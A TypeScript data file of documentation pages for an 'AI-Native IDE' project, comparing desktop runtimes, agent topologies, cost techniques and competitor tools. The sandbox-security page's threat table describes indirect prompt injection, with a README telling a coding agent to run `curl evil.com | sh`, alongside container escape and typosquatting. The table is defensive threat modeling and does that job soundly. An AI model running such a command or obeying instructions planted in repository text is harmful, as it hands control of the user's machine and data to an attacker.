import { DocPage } from '../../types/docs';

export const researchPages: DocPage[] = [
  {
    slug: 'research/desktop-frameworks',
    title: 'Desktop Runtime Matrix (Electron vs Tauri)',
    description: 'In-depth research and comparative benchmark of Electron, Tauri, Neutralino, and Wails for AI IDEs.',
    section: 'Research',
    category: 'Academic & Industry Research',
    order: 1,
    checkedDate: 'September 2026',
    tags: ['desktop', 'electron', 'tauri', 'neutralino', 'wails', 'benchmarks'],
    content: {
      lead: 'An exhaustive technical evaluation of cross-platform desktop application runtimes, evaluating memory footprint, native Node.js support, Docker integration, and student accessibility.',
      interactiveComponent: 'desktop-comparison',
      sections: [
        {
          id: 'framework-matrix',
          title: 'Comprehensive Framework Comparison Matrix',
          body: 'Selecting a desktop runtime for an AI IDE is fundamentally different from a simple markdown notes app. An IDE requires PTY terminal allocation, raw subprocess streaming, file watching on 50,000+ nodes, and direct Docker socket communication.',
          table: {
            headers: ['Evaluation Dimension', 'Electron v32', 'Tauri v2', 'Neutralinojs v5', 'Wails v2'],
            rows: [
              ['Architecture', 'Bundled Chromium + Node.js runtime per window', 'Native Webview (WebKit/WebView2) + Rust backend', 'Native Webview + C++ standalone binary', 'Native Webview + Go backend'],
              ['Idle RAM Consumption', '180 – 260 MB', '35 – 60 MB', '25 – 45 MB', '40 – 70 MB'],
              ['Binary Package Size', '85 – 130 MB', '8 – 15 MB', '3 – 8 MB', '12 – 22 MB'],
              ['Node.js Ecosystem Access', 'Native & Direct (all npm C++ addons work)', 'Requires sidecars or custom Rust bindings', 'Requires child process extension', 'Requires Go IPC bindings or sidecars'],
              ['Rust Requirement', 'No (TypeScript / JavaScript only)', 'Yes (Rust compiler & toolchain required)', 'No (C++ precompiled)', 'No (Go toolchain required)'],
              ['Python / Docker Interop', 'Trivial via node-dockerode and python-shell', 'Fast via Rust bollard crate and std::process', 'Limited to external CLI execution', 'Fast via Go docker-client and os/exec'],
              ['Terminal / PTY Support', 'Flawless (node-pty C++ bindings)', 'Requires custom portable-pty Rust integration', 'Basic stdin/stdout pipe only', 'Requires go-pty bindings'],
              ['Filesystem & File Watchers', 'Native (chokidar / fsevents)', 'Rust notify crate (very fast)', 'Limited C++ file API', 'Go fsnotify (fast)'],
              ['Security Architecture', 'Requires manual hardening (contextIsolation, CSP)', 'Secure by default (scoped permission system)', 'Permission-based manifest', 'Go runtime memory safe'],
              ['OS Compatibility', 'Tier 1 on Win, macOS, Linux', 'Tier 1 on Win, macOS, Linux, Mobile', 'Win, macOS, Linux', 'Win, macOS, Linux'],
              ['Student Developer Difficulty', 'Low (Standard Web + Node.js)', 'High (Requires learning Rust ownership & async)', 'Medium (Limited community & plugins)', 'Medium (Requires learning Go)'],
            ],
          },
        },
        {
          id: 'mvp-recommendation',
          title: 'Technical Recommendation for MVP vs Long-Term',
          callout: {
            type: 'important',
            title: 'Architectural Recommendation',
            text: 'For the 10-Day MVP and student ecosystem, Electron is the pragmatically superior choice despite higher RAM usage, because node-pty, monaco-editor, and dockerode require zero native compiler acrobatics. For v1.0 Production, a hybrid Tauri v2 architecture with a decoupled Node/Rust daemon provides the optimal balance of 40MB idle RAM and full security isolation.',
          },
        },
        {
          id: 'deep-dive-tradeoffs',
          title: 'Detailed Tradeoff Breakdown',
          cards: [
            {
              title: 'Electron: Rapid Development vs Memory Overhead',
              description: 'Pros: Immediate access to VS Code\'s battle-tested Monaco Editor, xterm.js with node-pty, and every npm library. Cons: 200MB base RAM.',
              badge: 'Fastest to Build',
            },
            {
              title: 'Tauri v2: Minimal Footprint vs Rust Steep Learning Curve',
              description: 'Pros: 10x smaller installers, native OS webviews, Rust memory safety. Cons: Students must learn Rust to bind complex PTY and Docker socket abstractions.',
              badge: 'Best Performance',
            },
            {
              title: 'Neutralinojs: Ultra-Lightweight vs Limited Ecosystem',
              description: 'Pros: Tiny 5MB bundle, zero dependencies. Cons: Missing robust PTY bindings and limited IDE plugin ecosystem.',
              badge: 'Ultra-light',
            },
            {
              title: 'Wails: Clean Go Concurrency vs Webview Inconsistencies',
              description: 'Pros: Go goroutines are excellent for multi-agent daemons. Cons: WebKitGTK on Linux can exhibit subtle rendering differences.',
              badge: 'Go Powered',
            },
          ],
        },
      ],
      relatedPages: [
        { title: 'Desktop Architecture', slug: 'desktop/desktop-architecture' },
        { title: '10-Day MVP Plan', slug: '10-day-mvp/mvp-overview' },
      ],
    },
  },
  {
    slug: 'research/multi-agent-systems',
    title: 'Multi-Agent Systems & Topologies',
    description: 'Literature review of agent topologies: Hierarchical, Peer-to-Peer, Blackboard, and DAG-orchestrated systems.',
    section: 'Research',
    category: 'Academic & Industry Research',
    order: 2,
    checkedDate: 'September 2026',
    tags: ['research', 'multi-agent', 'topologies', 'papers'],
    content: {
      lead: 'A review of recent academic literature on LLM agent collaboration, comparing conversational swarm models with deterministic graph orchestrators.',
      sections: [
        {
          id: 'topology-comparison',
          title: 'Comparison of Collaboration Topologies',
          table: {
            headers: ['Topology', 'Communication Style', 'Failure Compounding Risk', 'Suitability for Production Coding'],
            rows: [
              ['Conversational Swarm (Chat)', 'Free-form LLM group chat', 'Extreme (>60% error cascade)', 'Poor (Unpredictable termination)'],
              ['Hierarchical (Manager-Worker)', 'Manager delegates to workers', 'Moderate (Manager single point of failure)', 'Moderate'],
              ['Blackboard Architecture', 'Shared state memory store', 'Low (Requires strict schema locks)', 'Good for research / exploration'],
              ['Deterministic DAG (AI-Native IDE)', 'Acyclic graph with verified test feedback', 'Minimal (Isolated task boundaries & gates)', 'Best (High reproducibility & testability)'],
            ],
          },
        },
      ],
      relatedPages: [
        { title: 'Task Graph & DAG', slug: 'architecture/task-graph' },
      ],
    },
  },
  {
    slug: 'research/autonomous-coding',
    title: 'Autonomous Coding & Repair',
    description: 'Empirical analysis of SWE-bench benchmarks, AST-guided repair, and automated regression testing.',
    section: 'Research',
    category: 'Academic & Industry Research',
    order: 3,
    checkedDate: 'September 2026',
    tags: ['autonomous-coding', 'swe-bench', 'repair', 'empirical'],
    content: {
      lead: 'Research demonstrates that test-driven autonomous repair loops increase issue resolution on SWE-bench Lite from 12% to over 38%.',
      sections: [
        {
          id: 'swe-bench-insights',
          title: 'Why Test-Driven Feedback Matters',
          body: 'When models write code without runtime feedback, they make semantic errors in 4 out of 5 non-trivial patches. Providing the model with compiler errors and unit test stack traces allows reflection algorithms to converge on correct solutions within 2.3 iterations on average.',
        },
      ],
      relatedPages: [
        { title: 'Automatic Repair', slug: 'autonomy/repair-loop' },
      ],
    },
  },
  {
    slug: 'research/sandbox-security',
    title: 'Sandbox Security in Agentic IDEs',
    description: 'Threat modeling autonomous developer tools: container breakouts, prompt injections, and data leaks.',
    section: 'Research',
    category: 'Academic & Industry Research',
    order: 4,
    checkedDate: 'September 2026',
    tags: ['sandbox', 'security', 'cve', 'threat-model'],
    content: {
      lead: 'Autonomous agents present a unique threat profile: untrusted inputs (web pages, repositories) can induce agents to run malicious shell scripts.',
      sections: [
        {
          id: 'threat-model-summary',
          title: 'Threat Matrix & Countermeasures',
          table: {
            headers: ['Threat Vector', 'Mechanism', 'Mitigation Strategy'],
            rows: [
              ['Indirect Prompt Injection', 'Malicious README or issue comments telling agent to run `curl evil.com | sh`', 'Command allowlisting; network egress filtering'],
              ['Container Escape', 'Exploiting kernel vulnerability to access host OS', 'Non-root execution; drop all capabilities; read-only root'],
              ['Supply Chain Poisoning', 'Agent hallucinating malicious typosquatted package name', 'Package registry verification and dependency manifest diff approvals'],
            ],
          },
        },
      ],
      relatedPages: [
        { title: 'Security Model', slug: 'architecture/security-model' },
      ],
    },
  },
  {
    slug: 'research/cost-optimization',
    title: 'LLM Cost Optimization Techniques',
    description: 'Empirical evaluation of prompt caching, AST context pruning, and multi-tier model cascade efficiency.',
    section: 'Research',
    category: 'Academic & Industry Research',
    order: 5,
    checkedDate: 'September 2026',
    tags: ['cost-optimization', 'prompt-caching', 'tokens'],
    content: {
      lead: 'Through prompt prefix caching and AST pruning, the AI-Native IDE achieves an 82% reduction in total token costs compared to naive chat implementations.',
      sections: [
        {
          id: 'optimization-savings',
          title: 'Token Reduction Breakdown',
          table: {
            headers: ['Optimization Method', 'Token Reduction', 'Implementation Complexity', 'User Impact'],
            rows: [
              ['AST Interface Pruning', '60 – 75% reduction', 'Medium (Tree-sitter AST visitor)', 'Zero loss of architectural accuracy'],
              ['Prompt Prefix Caching', '80 – 90% cost savings on cached tokens', 'Low (Provider cache headers)', 'Sub-second first-token latency'],
              ['Tier 1 Local Routing', '100% cost elimination on formatting/planning', 'Medium (LiteLLM router)', 'Free development for students'],
            ],
          },
        },
      ],
      relatedPages: [
        { title: 'Token & Cost Management', slug: 'models/token-cost-management' },
      ],
    },
  },
  {
    slug: 'research/competitive-analysis',
    title: 'Open-Source Landscape & Competitors',
    description: 'Architectural comparison with Cursor, OpenHands, Cline, Continue.dev, and Devin.',
    section: 'Research',
    category: 'Academic & Industry Research',
    order: 6,
    checkedDate: 'September 2026',
    tags: ['competitors', 'openhands', 'cline', 'cursor', 'analysis'],
    content: {
      lead: 'An objective technical analysis of current AI programming assistants and agent platforms.',
      sections: [
        {
          id: 'competitor-matrix',
          title: 'Competitive Architecture Comparison',
          table: {
            headers: ['Tool / Platform', 'Architecture', 'Multi-Agent Support', 'Open Source?', 'Local Model Friendly?'],
            rows: [
              ['Cursor', 'Proprietary VS Code fork', 'Single agent with background composer', 'No (Closed Source)', 'Partial (API key only)'],
              ['OpenHands', 'Docker-based autonomous agent', 'Event stream, single agent primary', 'Yes (MIT)', 'Yes (Ollama / LiteLLM)'],
              ['Cline / Roo-Code', 'VS Code extension', 'Task-oriented single agent with tools', 'Yes (Apache 2.0)', 'Yes (Ollama / OpenRouter)'],
              ['Continue.dev', 'VS Code & JetBrains extension', 'Chat & autocomplete focused', 'Yes (Apache 2.0)', 'Yes (Ollama / vLLM)'],
              ['AI-Native IDE (Our Project)', 'Dedicated desktop multi-agent DAG platform', 'Full 11-agent DAG collaboration', 'Yes (MIT)', 'Yes (Tier 1 Local First)'],
            ],
          },
        },
      ],
      relatedPages: [
        { title: 'OpenHands & Cline Analysis', slug: 'resources/openhands-cline' },
      ],
    },
  },
];
